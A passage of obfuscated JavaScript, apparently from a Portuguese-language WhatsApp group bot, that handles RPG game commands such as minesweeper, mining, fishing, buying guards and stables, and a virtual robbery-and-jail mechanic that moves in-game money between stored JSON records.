              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (_0x1928c8) {
                return _0x403602("Uma partida já foi iniciada, espere acabar para iniciar uma nova...");
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("*Diga a dificuldade: easy, normal, hard*");
              }
              teks = _0x40e45c[0].toLowerCase();
              if (teks == "easy") {
                q_mines = 5;
              } else if (teks == "normal") {
                q_mines = 8;
              } else if (teks == "hard") {
                q_mines = 12;
              } else {
                return _0x403602("Dificuldade inválida...");
              }
              p_mines = await getMinesPositions(_0x20193e, q_mines);
              atp = q_mines == 5 ? 3 : q_mines == 8 ? 5 : q_mines == 12 ? 8 : 5;
              ctw = _0x20193e.filter(function (_0x43de9a) {
                return !p_mines.includes(_0x43de9a);
              });
              var _0xccfc6c = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/minesframe.json"));
              const _0x3d76cb = {
                id: _0x4f1071,
                jogador: _0x32e455,
                pos_mines: p_mines,
                qnt_mines: q_mines,
                selected_cord: [],
                cord_to_win: ctw,
                attempts: atp,
                tips_d: 0,
                hits: 0,
                minesp: _0xccfc6c
              };
              mines.push(_0x3d76cb);
              fs.writeFileSync("./DADOS/usuarios/grupos/games/mines.json", JSON.stringify(mines, null, 2));
              const _0xf73aa3 = {
                url: minado_bomb
              };
              const _0x608e2c = {
                image: _0xf73aa3,
                caption: "💣 *Campo Minado:*\n\t• Não sabe como jogar? Use o comando: *" + _0x1d93be + "mineshelp*\n\t• Caso desejar encerrar ou resetar a partida, use: *" + _0x1d93be + "minareset*\n-\n• *Números:* 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣\n• *Coluna A:* 🟦 🟦 🟦 🟦 🟦\n• *Coluna B:* 🟦 🟦 🟦 🟦 🟦\n• *Coluna C:* 🟦 🟦 🟦 🟦 🟦\n• *Coluna D:* 🟦 🟦 🟦 🟦 🟦\n• *Coluna E:* 🟦 🟦 🟦 🟦 🟦\n—\n• Mina(s): *" + q_mines + "*\n• Dificuldade: *" + teks + "*\n• Tentativa(s): *" + atp + "*"
              };
              _0x263319.sendMessage(_0x4f1071, _0x608e2c);
              break;
            case "mina":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!_0x1928c8) {
                return _0x403602("Nehuma partida foi iniciada no grupo atualmente!");
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Diga a dificuldade: easy, normal, hard");
              }
              if (JSON.stringify(mines[mines.map(_0x3860f9 => _0x3860f9.id).indexOf(_0x4f1071)]).includes(_0x32e455)) {
                teks = _0x40e45c[0].toLowerCase();
                play_i = _0x4897be.indexOf(_0x4f1071);
                const _0xd9ff50 = Math.floor(Math.random() * 10000);
                for (let _0x4d42ab of _0x40e45c) {
                  teks = _0x4d42ab.toLowerCase();
                  if (!_0x20193e.includes(teks)) {
                    return _0x403602("Escolha uma coordenada");
                  }
                  if (mines[play_i].selected_cord.includes(teks)) {
                    return _0x403602("Coordenada já selecionada!");
                  }
                  if (mines[play_i].pos_mines.includes(teks)) {
                    mines[play_i].minesp[teks] = "💣";
                    mines[play_i].attempts -= 1;
                    mines[play_i].tips_d = 0;
                  } else {
                    mines[play_i].minesp[teks] = "⭐";
                    mines[play_i].hits += 1;
                    mines[play_i].tips_d += 1;
                  }
                  mines[play_i].selected_cord.push(teks);
                }
                e = mines[play_i].minesp;
                res_teks = "💣 *Campo Minado:*\n\t• Não sabe como jogar? Use o comando: *" + _0x1d93be + "mineshelp*\n\t• Caso desejar encerrar ou resetar a partida, use: *" + _0x1d93be + "minareset*\n—\n• *Números:* 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣\n• *Coluna A:* " + e.a1 + " " + e.a2 + " " + e.a3 + " " + e.a4 + " " + e.a5 + "\n• *Coluna B:* " + e.b1 + " " + e.b2 + " " + e.b3 + " " + e.b4 + " " + e.b5 + "\n• *Coluna C:* " + e.c1 + " " + e.c2 + " " + e.c3 + " " + e.c4 + " " + e.c5 + "\n• *Coluna D:* " + e.d1 + " " + e.d2 + " " + e.d3 + " " + e.d4 + " " + e.d5 + "\n• *Coluna E:* " + e.e1 + " " + e.e2 + " " + e.e3 + " " + e.e4 + " " + e.e5 + "\n—\n• Mina(s): *" + mines[play_i].qnt_mines + "*\n• Tentativa(s): *" + mines[play_i].attempts + "*\n• Acerto(s): *" + mines[play_i].hits + "*";
                if (mines[play_i].attempts <= 0) {
                  res_teks += "\n——\n😿💔 Nossa que pena, suas chances esgotaram! Você acaba de perder e a chance de receber *R$ " + Number(_0xd9ff50).toFixed(2) + "* em sua carteira.";
                  await mines.splice(play_i, 1);
                  fs.writeFileSync("./DADOS/usuarios/grupos/games/mines.json", JSON.stringify(mines, null, 2));
                  const _0x58b1b3 = {
                    url: minado_bomb
                  };
                  const _0x181c69 = {
                    image: _0x58b1b3,
                    caption: res_teks
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x181c69);
                } else if (mines[play_i].selected_cord.length >= mines[play_i].cord_to_win.length) {
                  containAll = mines[play_i].cord_to_win.every(_0x4e3579 => {
                    return mines[play_i].selected_cord.includes(_0x4e3579);
                  });
                  if (containAll) {
                    res_teks += "\n——\n🥳🌟 Meus parabéns e como recompensa da vitória, você acaba de ganhar *R$ " + Number(_0xd9ff50).toFixed(2) + "* em sua carteira.";
                    USER = sabrpg.map(_0x3924f4 => _0x3924f4.id).indexOf(_0x32e455);
                    MONEYATUAL = sabrpg[_0x3529b0].money;
                    sabrpg[USER].money = Number(MONEYATUAL) + Number(_0xd9ff50);
                    await mines.splice(play_i, 1);
                    fs.writeFileSync("./DADOS/usuarios/grupos/games/mines.json", JSON.stringify(mines, null, 2));
                    const _0x194180 = {
                      url: minado_bomb
                    };
                    const _0x2aaa3f = {
                      image: _0x194180,
                      caption: res_teks
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x2aaa3f);
                  }
                } else if (mines[play_i].tips_d >= 3) {
                  res_teks += "\n—\nVocê tem direito a *" + parseInt(mines[play_i].tips_d / 3) + "* Dica(s).\n\nUse: " + _0x1d93be + "minesdica";
                  fs.writeFileSync("./DADOS/usuarios/grupos/games/mines.json", JSON.stringify(mines, null, 2));
                  const _0x1ea605 = {
                    url: minado_bomb
                  };
                  const _0x299460 = {
                    image: _0x1ea605,
                    caption: res_teks
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x299460);
                } else {
                  fs.writeFileSync("./DADOS/usuarios/grupos/games/mines.json", JSON.stringify(mines, null, 2));
                  const _0x4b14b6 = {
                    url: minado_bomb
                  };
                  const _0x1ccbdf = {
                    image: _0x4b14b6,
                    caption: res_teks
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x1ccbdf);
                }
              } else {
                return _0x403602("Já existe uma partida ocorrendo no grupo, não é possível iniciar outra! Aguarde acabar a atual, para iniciar a sua partida senhor(a) :(");
              }
              break;
            case "minareset":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!JSON.stringify(mines).includes(_0x4f1071) && !_0x2a5ff3) {
                return _0x403602("Não existe nenhuma partida ainda em andamento no grupo.");
              }
              nosei = _0x2a5ff3 ? 0 : mines.map(_0x14bc45 => _0x14bc45.id).indexOf(_0x4f1071);
              if (mines[nosei].jogador == _0x32e455 || _0x150e9e || _0x2a5ff3) {
                mines.splice(nosei, 1);
                fs.writeFileSync("./DADOS/usuarios/grupos/games/mines.json", JSON.stringify(mines, null, 2));
                _0x403602("O campo minado foi resetado com sucesso, a partida foi deletada.");
              } else {
                _0x403602("Somente o(s) adm(s) ou a pessoa que iniciou o jogo podem resetar.");
              }
              break;
            case "mineshelp":
              _0x403602(MinesHelp(_0x1d93be));
              break;
            case "minesdica":
              if (!_0x1928c8) {
                return _0x403602("- Nenhuma partida foi iniciada no grupo atualmente!");
              }
              if (JSON.stringify(mines[mines.map(_0x16eb6b => _0x16eb6b.id).indexOf(_0x4f1071)]).includes(_0x32e455)) {
                play_i = _0x4897be.indexOf(_0x4f1071);
                if (mines[play_i].tips_d >= 3) {
                  is_columns = Math.random() < 0.5;
                  if (!is_columns) {
                    m_sorted = Math.floor(Math.random() * mines[play_i].pos_mines.length + 0);
                    row = mines[play_i].pos_mines[m_sorted].charAt(0);
                    mines_row = 0;
                    for (let _0x247cff of mines[play_i].pos_mines) {
                      if (_0x247cff.startsWith(row)) {
                        mines_row += 1;
                      }
                    }
                    mines[play_i].tips_d -= 3;
                    fs.writeFileSync("./DADOS/usuarios/grupos/games/mines.json", JSON.stringify(mines, null, 2));
                    _0x403602("💡 Há *" + mines_row + "* bomba(s) na fileira *" + row + "*");
                  } else {
                    m_sorted = Math.floor(Math.random() * mines[play_i].pos_mines.length + 0);
                    column = mines[play_i].pos_mines[m_sorted].charAt(1);
                    mines_column = 0;
                    for (let _0x390508 of mines[play_i].pos_mines) {
                      if (_0x390508.endsWith(column)) {
                        mines_column += 1;
                      }
                    }
                    mines[play_i].tips_d -= 3;
                    fs.writeFileSync("./DADOS/usuarios/grupos/games/mines.json", JSON.stringify(mines, null, 2));
                    _0x403602("💡 Há *" + mines_column + "* bomba(s) na coluna *" + column + "*");
                  }
                } else {
                  return _0x403602("*Acerte 3 ou mais vezes para ter direito a uma dica...*");
                }
              } else {
                return _0x403602("Você não pode usar este comando agora, por motivo que está ocorrendo uma partida e você não é o jogador atuante das respostas. :(");
              }
              break;
            case "comprarvara":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (JSON.stringify(pescaria).includes(_0x32e455)) {
                return _0x403602("Olá *pescador(a)*, você já tem uma vara de pesca! 🎣🌟 Não é possível comprar outra, pois você já possui uma.");
              }
              if (Number(sabrpg[_0x3529b0].money) < Number(50)) {
                return _0x403602("😿💧 Você não possuí saldo suficiente para realizar a compra de uma vara!");
              }
              sabrpg[_0x3529b0].money -= Number(50);
              pescaria.push(_0x32e455);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/pescaria.json", JSON.stringify(pescaria));
              _0x403602("🌟😍 Você acaba de adquirir uma vara de pescar, agora você está hábito.");
              break;
            case "minerar":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! Use *" + _0x1d93be + "modorpg 1*.");
              }
              if (!_0x23cd8e) {
                return _0x403602(mess.warningMB(_0x1d93be));
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar no Bot City.");
              }
              minu = moment.tz("America/Sao_Paulo").format("mm");
              if (!JSON.stringify(minerar).includes(_0x32e455)) {
                const _0x436b63 = {
                  id: _0x32e455,
                  minuto: minu
                };
                minerar.push(_0x436b63);
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/minerar.json", JSON.stringify(minerar));
              }
              AC = minerar.map(_0x2e78d6 => _0x2e78d6.id).indexOf(_0x32e455);
              if (Number(minerar[AC].minuto) !== Number(minu)) {
                minerar[AC].minuto = minu;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                MINERAR_G = Math.floor(Math.random() * 100);
                _0x403602("- Iniciando mineração! Aguarde *5s* para obter o resultado...");
                if (Number(MINERAR_G) > 15) {
                  PD = ["nenhum mineral valioso", "nenhuma joia valiosa em sua busca", "nenhum diamante em sua caçada", "nenhum minério validoso", "nenhum cobre em sua caçada", "nada de redstone em sua caçada"];
                  txt = "😭 Em sua tentativa de mineração, não foi possível evidenciar " + PD[Math.floor(Math.random() * PD.length)] + "...";
                } else {
                  MT = Math.floor(Math.random() * 2000);
                  _0x3529b0 = sabrpg.map(_0x1fe307 => _0x1fe307.id).indexOf(_0x32e455);
                  MA = sabrpg[_0x3529b0].money;
                  sabrpg[_0x3529b0].money = Number(MA) + Number(MT);
                  mineMessage = ["Você estava minerando nas ilhas savitas e encontrou em seu caminho *R$ " + Number(MT).toFixed(2) + "* em minerais preciosos! 💰", "🗣💰 Você invadiu uma mina proibida e quando estava fazendo a mineração achou *R$ " + Number(MT).toFixed(2) + "* em troca de ouro!", "💎👷🏻‍♀️ Você invadiu uma mina de diamantes proibida, enquanto você estava fazendo a mineração, encontrou 2 diamantes equivalentes à *R$ " + Number(MT).toFixed(2) + "*.", "⛏️👷🏻‍♀️ Você escavou uma mina de ouro subterrânea em Minas Gerais e encontrou *R$ " + Number(MT).toFixed(2) + "*!", "🛫 Em uma de suas viagens para o interior da Flórida, você embarcou uma busca ao tesouro perdido e encontrou em seu caminho um cordão de ouro perdido avaliado em *R$ " + Number(MT).toFixed(2) + "*.", "😱🌟 Você invadiu a casa do vizinho e encontrou *R$ " + Number(MT).toFixed(2) + "* escavando o quintal dele.", "⛏️👷🏻‍♀️✨️ Você acaba de invadir em uma mina de esmeraldas desconhecida e encontrou *R$ " + Number(MT).toFixed(2) + "*", "🛥️💰 Você encontrou nas profundezas do oceanos, um tesouro em um navio antigo equivalente à *R$ " + Number(MT).toFixed(2) + "*.", "🌟 Você foi chamado para trabalhar na mina e encontrou milhares de resíduos! Como recompensa, você acaba de ganhar *R$ " + Number(MT).toFixed(2) + "*. 😸", "Você foi chamado para trabalhar na mina e encontrou muitos tesouros perdidos!👷🏼🌟 Como recompensa, você acaba de ganhar *R$ " + Number(MT).toFixed(2) + "*."];
                  txt = mineMessage[Math.floor(Math.random() * mineMessage.length)];
                }
                setTimeout(() => {
                  const _0x5d96f7 = {
                    text: txt
                  };
                  const _0x2fae15 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x5d96f7, _0x2fae15);
                }, 5000);
              } else {
                _0x403602("Por favor, aguarde *" + (60 - Number(moment.tz("America/Sao_Paulo").format("ss"))) + "s* para realizar uma nova mineração...");
              }
              break;
            case "comprarseguranca":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!_0x1d6557) {
                return _0x403602("Escolha na loja um segurança de 1-3 para proteger o seu dinheiro e evitar assaltos");
              }
              if (!JSON.stringify(roubosrpg).includes(_0x32e455)) {
                hora3 = moment.tz("America/Sao_Paulo").format("HH");
                data3 = moment.tz("America/Sao_Paulo").format("DD");
                const _0x15d1e0 = {
                  id: _0x32e455,
                  limite: 2,
                  hora: hora3,
                  dia: data3,
                  dinheiro: 0,
                  preso: false,
                  segurança: 20
                };
                roubosrpg.push(_0x15d1e0);
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/roubosrpg.json", JSON.stringify(roubosrpg));
              }
              if (Number(_0x40e45c[0]) > 0 && Number(_0x40e45c[0]) <= 3) {
                _0x4e84e2 = Number(_0x40e45c[0]) * 20 + 20;
                BC = sabrpg.map(_0x417012 => _0x417012.id).indexOf(_0x32e455);
                _0x3529b0 = roubosrpg.map(_0x23f9da => _0x23f9da.id).indexOf(_0x32e455);
                if (Number(Number(_0x40e45c[0]) * 600) > sabrpg[BC].money) {
                  return _0x403602("Você não tem dinheiro suficiente para comprar esse segurança...");
                }
                if (roubosrpg[_0x3529b0].segurança == _0x4e84e2) {
                  return _0x403602("Você já possui esse segurança...");
                }
                _0x264014 = _0x4e84e2 > roubosrpg[_0x3529b0].segurança ? "diminuída em " + (_0x4e84e2 - roubosrpg[_0x3529b0].segurança) + "%" : "aumentada em " + (_0x4e84e2 - roubosrpg[_0x3529b0].segurança) + "%";
                roubosrpg[_0x3529b0].segurança = _0x4e84e2;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/roubosrpg.json", JSON.stringify(roubosrpg));
                rmSaldo(_0x32e455, Number(_0x40e45c[0]) * 600);
                _0x403602("Segurança Lv." + _0x40e45c[0] + " comprado com sucesso 👨🏻‍✈️\nTaxa de drop " + _0x264014);
              } else {
                _0x403602("Escolha um número correspondente a um dos seguranças presentes na loja...");
              }
              break;
            case "treinar":
            case "treino":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              treinamento = ["Cê já treinou lek", "Hmm", "Tá bão", "Chega lek, cê já treinou", "Te acalma desgrama"];
              if (JSON.stringify(roubosrpg).includes(_0x32e455)) {
                return _0x403602("" + treinamento[Math.floor(Math.random() * treinamento.length)]);
              }
              hora3 = moment.tz("America/Sao_Paulo").format("HH");
              data3 = moment.tz("America/Sao_Paulo").format("DD");
              const _0x5373e3 = {
                id: _0x32e455,
                limite: 2,
                hora: hora3,
                dia: data3,
                dinheiro: 0,
                preso: false,
                segurança: 20
              };
              roubosrpg.push(_0x5373e3);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/roubosrpg.json", JSON.stringify(roubosrpg));
              _0x403602("Treinamento efetuado com sucesso... Pronto para assaltar outros usuários");
              break;
            case "assaltar":
            case "furtar":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(roubosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa treinar primeiro... Use " + _0x1d93be + "treinar");
              }
              if (!_0x1dcf0a) {
                return _0x403602("Marque a pessoa quem você quer assaltar...");
              }
              if (_0x32e455.includes(_0x1dcf0a)) {
                return _0x403602("Não é possível assaltar você mesmo...");
              }
              if (!JSON.stringify(sabrpg).includes(_0x1dcf0a)) {
                return _0x403602("ID do usuário não encontrado ou inexistente...");
              }
              jeffinho = Math.floor(Math.random() * 100);
              _0x3529b0 = sabrpg.map(_0x2cd7df => _0x2cd7df.id).indexOf(_0x32e455);
              AD = roubosrpg.map(_0x2a1e7a => _0x2a1e7a.id).indexOf(_0x32e455);
              hora3 = moment.tz("America/Sao_Paulo").format("HH");
              data3 = moment.tz("America/Sao_Paulo").format("DD");
              minuto3 = moment.tz("America/Sao_Paulo").format("mm");
              if (roubosrpg[AD].preso == true) {
                return _0x403602("Você está preso, portanto, não é possível roubar...");
              }
              if (Number(sabrpg[sabrpg.map(_0x336c09 => _0x336c09.id).indexOf(_0x1dcf0a)].money) < 10) {
                return _0x403602("Esse ser não tem nem onde cair morto, pobre desgramado... Vai assaltar alguém mais rico 🤡");
              }
              if (roubosrpg[AD].limite <= 0 && Number(roubosrpg[AD].hora) === Number(hora3) && Number(roubosrpg[AD].dia) === Number(data3)) {
                return _0x403602("Hmm... Agora não " + sabrpg[_0x3529b0].nome + ", aguarde " + (Number(Number(Number(hora3) + 1) * 60) - Number(Number(roubosrpg[AD].hora) * 60 + Number(minuto3))) + " minutos para fazer o próximo assalto 🥷🏻");
              }
              if (roubosrpg[AD].limite <= 0 && Number(hora3) > Number(roubosrpg[AD].hora) && Number(roubosrpg[AD].dia) === Number(data3)) {
                roubosrpg[AD].limite = 2;
                roubosrpg[AD].hora = hora3;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/roubosrpg.json", JSON.stringify(roubosrpg));
              }
              if (roubosrpg[AD].limite <= 0 && Number(roubosrpg[AD].dia) !== Number(data3)) {
                roubosrpg[AD].limite = 2;
                roubosrpg[AD].hora = hora3;
                roubosrpg[AD].dia = data3;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/roubosrpg.json", JSON.stringify(roubosrpg));
              }
              if (roubosrpg[AD].limite > 0 && roubosrpg[AD].preso == false) {
                roubosrpg[AD].limite -= 1;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/roubosrpg.json", JSON.stringify(roubosrpg));
                if (jeffinho > 5) {
                  jeffinho2 = Math.floor(Math.random() * 100);
                  lvx = Number(Math.floor(Math.random() * 39) + 1);
                  totalM = lvx * 100;
                  totalU = sabrpg[sabrpg.map(_0x4e66c0 => _0x4e66c0.id).indexOf(_0x1dcf0a)].money - 1;
                  ganho = totalM > Number(sabrpg[sabrpg.map(_0x15183e => _0x15183e.id).indexOf(_0x1dcf0a)].money) ? Math.floor(Math.random() * totalU) + 1 : Math.floor(Math.random() * 100) * lvx;
                  algo = JSON.stringify(roubosrpg).includes(_0x1dcf0a) ? roubosrpg[roubosrpg.map(_0x746039 => _0x746039.id).indexOf(_0x1dcf0a)].segurança : 20;
                  if (jeffinho2 > algo) {
                    sabrpg[_0x3529b0].money += ganho;
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                    sabrpg[sabrpg.map(_0x1b49de => _0x1b49de.id).indexOf(_0x1dcf0a)].money -= ganho;
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                    _0x403602("Assalto efetuado com sucesso " + sabrpg[_0x3529b0].nome + ", você roubou R$ " + Number(ganho).toFixed(2) + " da conta " + sabrpg[sabrpg.map(_0x9a1158 => _0x9a1158.id).indexOf(_0x1dcf0a)].nome);
                  } else {
                    perda1 = Number(ganho) / 2;
                    perda2 = perda1 >= sabrpg[_0x3529b0].money ? sabrpg[_0x3529b0].money : perda1;
                    sabrpg[_0x3529b0].money -= perda2;
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                    _0x403602("🚓 Ops, você foi pego pela polícia e pagou " + (perda1 >= sabrpg[_0x3529b0].money ? "todo o seu dinheiro" : "R$ " + Number(perda2).toFixed(2)) + " para sair da cadeia... Kkkk sinto muito 😔🤙🏽");
                  }
                } else {
                  jeffinho3 = Math.floor(Math.random() * 100);
                  if (jeffinho3 > 10) {
                    roubosrpg[AD].dinheiro += sabrpg[_0x3529b0].money;
                    roubosrpg[AD].preso = true;
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/roubosrpg.json", JSON.stringify(roubosrpg));
                    sabrpg[_0x3529b0].money = 0;
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                    _0x403602("Putz, cê deu muito azar... Seu caso foi passado para o governo federal, e toda a sua grana foi apreendida 😮‍💨\nFelizmente, cê pode pegar o dinheiro de volta amanhã usando " + _0x1d93be + "retirar");
                  } else {
                    if (JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                      R1 = cavalosrpg.map(_0x43132b => _0x43132b.id).indexOf(_0x32e455);
                      cavalosrpg.splice(R1, 1);
                      fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                    }
                    if (JSON.stringify(galosrpg).includes(_0x32e455)) {
                      R2 = galosrpg.map(_0x209b48 => _0x209b48.id).indexOf(_0x32e455);
                      galosrpg.splice(R2, 1);
                      fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                    }
                    roubosrpg[AD].preso = false;
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/roubosrpg.json", JSON.stringify(roubosrpg));
                    sabrpg[_0x3529b0].money = 0;
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                    _0x403602("Vix mlk, deu ruim demais... Seu assalto virou caso da INTERPOL, e ela confiscou todos os seu bens junto com seu dinheiro 👨🏻‍✈️");
                  }
                }
              }
              break;
            case "soltar":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!_0x1d6557 && !_0x1dcf0a) {
                return;
              }
              usu = _0x1dcf0a ? _0x1dcf0a : _0x1d6557 + "@s.whatsapp.net";
              if (!JSON.stringify(roubosrpg).includes(usu)) {
                return _0x403602("❌ ID não encontrado ou inexistente!");
              }
              AD = roubosrpg.map(_0x2d8561 => _0x2d8561.id).indexOf(_0x1dcf0a);
              roubosrpg[AD].preso = false;
              roubosrpg[AD].dinheiro = 0;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/roubosrpg.json", JSON.stringify(roubosrpg));
              _0x403602("Usuário solto.");
              break;
            case "revogar":
            case "reivindicar":
            case "retirar":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + " 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(roubosrpg).includes(_0x32e455)) {
                return _0x403602("Você não foi preso lek, aquieta o facho 😂");
              }
              _0x3529b0 = sabrpg.map(_0xd72abe => _0xd72abe.id).indexOf(_0x32e455);
              AD = roubosrpg.map(_0x3b54f6 => _0x3b54f6.id).indexOf(_0x32e455);
              data3 = moment.tz("America/Sao_Paulo").format("DD");
              if (roubosrpg[AD].dinheiro <= 0) {
                return _0x403602("Não há dinheiro apreendido...");
              }
              if (Number(roubosrpg[AD].dia) === Number(data3)) {
                return _0x403602("Você só pode retirar o dinheiro apreendido amanhã...");
              }
              _0x403602("Pronto, aqui estão os R$ " + Number(roubosrpg[AD].dinheiro).toFixed(2) + " que foram apreendidos pela polícia... Vê se anda na linha mlk 👨🏻‍✈️");
              sabrpg[_0x3529b0].money += roubosrpg[AD].dinheiro;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              roubosrpg[AD].preso = false;
              roubosrpg[AD].dinheiro = 0;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/roubosrpg.json", JSON.stringify(roubosrpg));
              break;
            case "comprarestabulo":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              _0x3529b0 = sabrpg.map(_0x529aae => _0x529aae.id).indexOf(_0x32e455);
              if (JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                return _0x403602("Você já tem um estábulo em seu nome " + sabrpg[_0x3529b0].nome + "... 🐎");
              }
              if (Number(sabrpg[_0x3529b0].money) < 500) {
                return _0x403602("Você não tem saldo suficiente para efetuar essa compra...");
              }
              cavH = moment.tz("America/Sao_Paulo").format("HH");
              cavD = moment.tz("America/Sao_Paulo").format("DD");
              cavM = moment.tz("America/Sao_Paulo").format("MM");
              const _0x55a992 = {
                id: _0x32e455,
                level: 1,
                quant_cavalos: 0,
                setcav: "nenhum",
                countVc: 0,
                capitalVc: 0,
                countDc: 0,
                capitalDc: 0,
                corridaL: 10,
                corridaH: cavH,
                corridaD: cavD,
                corridaM: cavM,
                cavalos: []
              };
              cavalosrpg.push(_0x55a992);
